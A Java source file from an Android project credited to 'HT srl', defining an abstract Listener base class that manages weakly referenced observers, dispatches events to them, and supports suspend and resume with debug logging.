/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 20-apr-2011
 **********************************************/

package com.android.dvci.listener;

import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.util.Check;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public abstract class Listener<U> {
	/**
	 * The Constant TAG.
	 */
	private static final String TAG = "Listener"; //$NON-NLS-1$

	protected List<WeakReference<Observer<U>>> observers;

	private boolean suspended;

	private Object suspendLock = new Object();

	public Listener() {
		observers = new ArrayList<WeakReference<Observer<U>>>();
	}

	public synchronized boolean attach(Observer<U> o) {
		// Object already in the stack

		for (Iterator<WeakReference<Observer<U>>> iterator = observers.iterator();
		     iterator.hasNext(); ) {
			WeakReference<Observer<U>> weakRef = iterator.next();
			if (weakRef.get() == o) {
				return false;
			}
		}

		if (observers.isEmpty()) {
			start();
		}

		observers.add(new WeakReference<Observer<U>>(o));
		if (Cfg.DEBUG) {
			Check.log(TAG + " (attach): adding:"+o.hashCode());
		}
		return true;
	}

	public synchronized void detach(Observer<U> o) {
		if (observers.isEmpty()) {
			return;
		}

		for (Iterator<WeakReference<Observer<U>>> iterator = observers.iterator();
		     iterator.hasNext(); ) {
			WeakReference<Observer<U>> weakRef = iterator.next();
			if (weakRef.get() == o) {
				weakRef.clear();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (detach): removing:"+o.hashCode());
				}
				iterator.remove();
			}
		}

		if (observers.isEmpty()) {
			stop();
		}
	}

	/**
	 * dispatch, per ogni observer registrato viene chiamato il notification
	 *
	 * @param elem
	 * @return
	 */
	int dispatch(U elem) {
		Object[] array;

		synchronized (this) {
			array = observers.toArray();
		}
		int result = 0;

		for (final Object element : array) {
			@SuppressWarnings("unchecked")
			final WeakReference<Observer<U>> observer = (WeakReference<Observer<U>>) element;
			if(observer.get() != null) {
				result |= observer.get().notification(elem);
			}
		}

		return result;
	}

	public void suspend() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (suspend)"); //$NON-NLS-1$
		}
		synchronized (suspendLock) {
			if (!suspended) {
				suspended = true;
				stop();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (suspend): not suspended");
				}
			}
		}
	}

	public void resume() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resume)"); //$NON-NLS-1$
		}
		synchronized (suspendLock) {
			if (suspended) {
				suspended = false;
				start();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (resume): already suspended");
				}
			}
		}
	}

	public boolean isSuspended() {
		synchronized (suspendLock) {
			return suspended;
		}
	}

	protected void setSuspended(boolean value) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (setSuspended): " + value);
		}
		synchronized (suspendLock) {
			suspended = value;
		}
	}

	protected abstract void start();

	protected abstract void stop();
}
